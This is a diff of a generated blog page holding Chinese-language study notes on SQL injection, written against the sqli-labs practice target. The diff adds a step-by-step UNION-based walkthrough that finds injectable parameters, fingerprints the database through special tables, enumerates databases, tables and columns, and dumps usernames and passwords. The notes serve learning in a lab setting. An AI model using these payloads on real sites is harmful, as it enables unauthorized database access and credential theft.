@@ -419,21 +419,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-05-08
+                    2021-05-09
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    661
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    5 分
                 </div>
                 
 
@@ -453,27 +453,37 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><h2 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h2><h3 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h3><h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h3 id="Base64变形注入"><a href="#Base64变形注入" class="headerlink" title="Base64变形注入"></a>Base64变形注入</h3><h2 id="以提交方式分类"><a href="#以提交方式分类" class="headerlink" title="以提交方式分类"></a>以提交方式分类</h2><h3 id="GET注入"><a href="#GET注入" class="headerlink" title="GET注入"></a>GET注入</h3><h3 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h3><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><h3 id="HTTP头注入（XFF注入、UA注入、REFERER注入）"><a href="#HTTP头注入（XFF注入、UA注入、REFERER注入）" class="headerlink" title="HTTP头注入（XFF注入、UA注入、REFERER注入）"></a>HTTP头注入（XFF注入、UA注入、REFERER注入）</h3><h2 id="以获取信息的方式分类"><a href="#以获取信息的方式分类" class="headerlink" title="以获取信息的方式分类"></a>以获取信息的方式分类</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><h3 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h3><h2 id="判断是否存在注入点及其类型"><a href="#判断是否存在注入点及其类型" class="headerlink" title="判断是否存在注入点及其类型"></a>判断是否存在注入点及其类型</h2><ul>
-<li><p>可以使用单引号，双引号，单括号，双括号判断是否报错，报错的话可能存在sql注入</p>
-</li>
-<li><p>判断是否为数字型，若<code>and 1=1</code>页面正常<code>and 1=2</code>页面错误，则为数字型注入</p>
+                <h1 id="sql注入学习"><a href="#sql注入学习" class="headerlink" title="sql注入学习"></a>sql注入学习</h1><h2 id="类型划分"><a href="#类型划分" class="headerlink" title="类型划分"></a>类型划分</h2><h3 id="以注入类型划分"><a href="#以注入类型划分" class="headerlink" title="以注入类型划分"></a>以注入类型划分</h3><p>数字型注入</p>
+<p>字符型注入</p>
+<p>搜索型注入</p>
+<p>宽字节注入</p>
+<p>Base64变形注入</p>
+<h3 id="以提交方式分类"><a href="#以提交方式分类" class="headerlink" title="以提交方式分类"></a>以提交方式分类</h3><p>GET注入</p>
+<p>POST注入</p>
+<p>Cookie注入</p>
+<p>HTTP头注入（XFF注入、UA注入、REFERER注入）</p>
+<h3 id="以获取信息的方式分类"><a href="#以获取信息的方式分类" class="headerlink" title="以获取信息的方式分类"></a>以获取信息的方式分类</h3><p>联合注入</p>
+<p>报错注入</p>
+<p>布尔盲注</p>
+<p>时间盲注</p>
+<p>堆查询注入</p>
+<h2 id="判断是否存在注入点及其类型"><a href="#判断是否存在注入点及其类型" class="headerlink" title="判断是否存在注入点及其类型"></a>判断是否存在注入点及其类型</h2><h4 id="判断是否存在注入"><a href="#判断是否存在注入" class="headerlink" title="判断是否存在注入"></a>判断是否存在注入</h4><p>可以使用单引号，双引号，单括号，双括号判断是否报错，报错的话可能存在sql注入</p>
+<h4 id="判断是否为数字型"><a href="#判断是否为数字型" class="headerlink" title="判断是否为数字型"></a>判断是否为数字型</h4><p>若<code>and 1=1</code>页面正常<code>and 1=2</code>页面错误，则为数字型注入</p>
 <blockquote>
 <p>原理：<code>select * from 表 where id=x</code></p>
 </blockquote>
 <blockquote>
 <p>因为如果是数字型注入的话<code>and 1=2</code>逻辑为假，会返回错误</p>
 </blockquote>
-</li>
-<li><p>判断是否为字符型，若<code>&#39;and &#39;1&#39;=&#39;1 </code>页面正常，<code>&#39;and &#39;1&#39;=&#39;2</code>页面错误，则为字符型</p>
+<h4 id="判断是否为字符型"><a href="#判断是否为字符型" class="headerlink" title="判断是否为字符型"></a>判断是否为字符型</h4><p>若<code>&#39;and &#39;1&#39;=&#39;1 </code>页面正常，<code>&#39;and &#39;1&#39;=&#39;2</code>页面错误，则为字符型</p>
 <blockquote>
 <p>原理：<code>select * from 表 where id=&#39;参数&#39;</code></p>
 </blockquote>
 <blockquote>
 <p>这里的sql语句相当于<code>select * from 表名 where id=&#39;参数&#39;and &#39;1&#39;=&#39;1&#39;</code>因为这里的参数是字符类型，而这样构造sql语句正好是字符类型</p>
 </blockquote>
-<p><strong>两者最大的区别就是字符型需要单引号来闭合，而数字型不需要</strong></p>
-</li>
-<li><p>判断是否为搜索型，根据<code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code>(相当于<code>and 1=1</code>)与<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code>的回显进行判断</p>
+<p>  <strong>两者最大的区别就是字符型需要单引号来闭合，而数字型不需要</strong></p>
+<h4 id="判断是否为搜索型"><a href="#判断是否为搜索型" class="headerlink" title="判断是否为搜索型"></a>判断是否为搜索型</h4><p>根据<code>%&#39; and 1=1 and &#39;%&#39;=&#39;</code>(相当于<code>and 1=1</code>)与<code>%&#39; and 1=2 and &#39;%&#39;=&#39;</code>的回显进行判断</p>
 <blockquote>
 <p>原理：<code>select * from 表 where username like &#39;%$name%&#39;</code></p>
 </blockquote>
@@ -483,22 +493,54 @@
 <blockquote>
 <p>pikachu靶场较详细的实例<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hunter-01001100/p/11628286.html">pikachu-搜索型注入 #手工注入</a></p>
 </blockquote>
-</li>
-</ul>
-<p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
+<p>**PS:**字符型和搜索型注入可能需要注释符对<code>&#39;</code>或<code>%&#39;</code>进行注释，如上面的判断字符型注入的语句可以修改为<code>&#39; and 1=1 # </code>和<code>&#39; and 1=2 #</code>来进行判断，而这里的<code>#</code>就是对sql语句后面的<code>&#39;</code>进行注释，同理搜索型也一样</p>
+<h4 id="易出现SQL注入的功能点"><a href="#易出现SQL注入的功能点" class="headerlink" title="易出现SQL注入的功能点"></a><strong>易出现SQL注入的功能点</strong></h4><blockquote>
+<p>凡是和数据库有交互的地方都容易出现SQL注入，SQL注入经常出现在登陆页面、涉及获取HTTP头（user-agent / client-ip等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在HTTP头中的  client-ip 和 x-forward-for 等字段处。这些字段是用来记录登陆的 i  p的，有可能会被存储进数据库中从而与数据库发生交互导致sql注入。</p>
+</blockquote>
+<h2 id="根据特殊表判断数据库类型"><a href="#根据特殊表判断数据库类型" class="headerlink" title="根据特殊表判断数据库类型"></a>根据特殊表判断数据库类型</h2><p>目前接触的大部分都是MySQL，绝大多数的数据库的SQL语句都类似，但是当遇到其他类型的数据库时还是要通过<strong>特殊表</strong>来分辨数据库类型</p>
 <p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E5%88%A4%E6%96%AD%E6%95%B0%E6%8D%AE%E5%BA%93.png" alt="判断数据库"></p>
-<blockquote>
+<h4 id="不同数据库的特殊表"><a href="#不同数据库的特殊表" class="headerlink" title="不同数据库的特殊表"></a>不同数据库的特殊表</h4><blockquote>
 <p>MySQL数据库的特有的表是 <strong>information_schema.tables ,</strong> access数据库特有的表是 <strong>msysobjects</strong> 、SQLServer 数据库特有的表是 <strong>sysobjects</strong> ,oracle数据库特有的表是 <strong>dual</strong></p>
 </blockquote>
 <p>判断语句：</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from information_schema.tables) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(<span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> msysobjects) #</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) #</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">//判断是否是Oracle数据库</span></span><br><span class="line"><span class="string">http://xxx/?id=1&#x27;</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> dual)<span class="operator">&gt;</span><span class="number">0</span> #</span><br></pre></td></tr></table></figure>
 <p>对于MySQL数据库，<strong>information_schema</strong>数据库中的表是一个视图，都是只读的，不能进行增删改的操作</p>
-<p>information_schema表中三个重要的表：</p>
-<ul>
-<li>information_schema.<strong>schemata</strong>该表存储了所有的数据库库名</li>
-<li>information_schema.<strong>tables</strong>该表存储了所有的</li>
-<li>information_schema.<strong>columns</strong></li>
+<blockquote>
+<p>information_schema数据库是MySQL5.0以上才有</p>
+</blockquote>
+<h4 id="information-schema表中三个重要的表："><a href="#information-schema表中三个重要的表：" class="headerlink" title="information_schema表中三个重要的表："></a>information_schema表中三个重要的表：</h4><ul>
+<li>information_schema.<strong>schemata</strong>该表存储了所有的库名</li>
+<li>information_schema.<strong>tables</strong>该表存储了所有的表名</li>
+<li>information_schema.<strong>columns</strong>该表存储了所有的列名</li>
 </ul>
+<h2 id="0x01union联合注入"><a href="#0x01union联合注入" class="headerlink" title="0x01union联合注入"></a>0x01union联合注入</h2><p>适用于页面有显示列的注入</p>
+<p>首先进行的是判断是否存在注入和确定其注入类型，然后<strong>根据注入类型</strong>依次进行列数判断、可显列、查库，查表、查列、查数据</p>
+<p>以下以字符型注入为例（sqli-labs靶场）：</p>
+<h3 id="列数判断"><a href="#列数判断" class="headerlink" title="列数判断"></a>列数判断</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by x #</span></span><br></pre></td></tr></table></figure>
+<h4 id="可显列"><a href="#可显列" class="headerlink" title="可显列"></a>可显列</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,3,...x #</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>对于没有可显列的问题，是因为页面只显示一行数据，可以使用形如<em>id=-1</em>来进行注释或是<code>and 1=2</code>对前面的条件进行否定</p>
+</blockquote>
+<h3 id="查库"><a href="#查库" class="headerlink" title="查库"></a>查库</h3><h4 id="先来了解一些常用函数"><a href="#先来了解一些常用函数" class="headerlink" title="先来了解一些常用函数"></a>先来了解一些常用函数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">·  version() ：数据库的版本</span><br><span class="line"></span><br><span class="line">·  database() :当前所在的数据库</span><br><span class="line"></span><br><span class="line">·  @@basedir : 数据库的安装目录</span><br><span class="line"></span><br><span class="line">·  @@datadir ： 数据库文件的存放目录</span><br><span class="line"></span><br><span class="line">·  user() ： 数据库的用户</span><br><span class="line"></span><br><span class="line">·  current_user() : 当前用户名</span><br><span class="line"></span><br><span class="line">·  system_user() : 系统用户名</span><br><span class="line"></span><br><span class="line">·  session_user() :连接到数据库的用户名</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,database(),system_user() --+</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/system_user().png" alt="image-20210509112349669"></p>
+<h3 id="查表"><a href="#查表" class="headerlink" title="查表"></a>查表</h3><p>已知数据库<code>security</code>查表</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&quot;security&quot; --+</span></span><br></pre></td></tr></table></figure>
+
+
+<h4 id="information-schema-tables表中记录了所有的表名"><a href="#information-schema-tables表中记录了所有的表名" class="headerlink" title="information_schema.tables表中记录了所有的表名"></a><em>information_schema.tables</em>表中记录了所有的表名</h4><h4 id="table-schema列记录了所有数据库的库名"><a href="#table-schema列记录了所有数据库的库名" class="headerlink" title="table_schema列记录了所有数据库的库名"></a><em>table_schema</em>列记录了所有数据库的库名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/information_schema%E8%A1%A8table_schema%E5%88%97.png" alt="image-20210509115335643"></p>
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E8%A1%A8.png" alt="image-20210509115550488"></p>
+<h3 id="查列"><a href="#查列" class="headerlink" title="查列"></a>查列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&quot;users&quot; --+</span></span><br></pre></td></tr></table></figure>
+<h4 id="information-schema-columns表中记录了所有的列名"><a href="#information-schema-columns表中记录了所有的列名" class="headerlink" title="information_schema.columns表中记录了所有的列名"></a><em>information_schema.columns</em>表中记录了所有的列名</h4><h4 id="table-name列中记录了所有的表名"><a href="#table-name列中记录了所有的表名" class="headerlink" title="table_name列中记录了所有的表名"></a><em>table_name</em>列中记录了所有的表名</h4><p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E5%88%97.png" alt="image-20210509122157896"></p>
+<h3 id="查数据"><a href="#查数据" class="headerlink" title="查数据"></a>查数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx<span class="operator">/</span>id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,group_concat(id,&#x27;</span><span class="comment">---&#x27;,username,&#x27;---&#x27;,password),3 from users --+</span></span><br></pre></td></tr></table></figure>
+
+
+<p><img src="/2021/05/06/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/%E6%9F%A5%E6%95%B0%E6%8D%AE.png" alt="image-20210509122715852"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235970#h3-2">SQL注入漏洞详解</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1638">【最全干货】SQL注入大合集</a></p>
 
                 
             </div>
@@ -900,7 +942,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">1.5k</span>&nbsp;字
+                class="white-color">2.1k</span>&nbsp;字
             
             
             
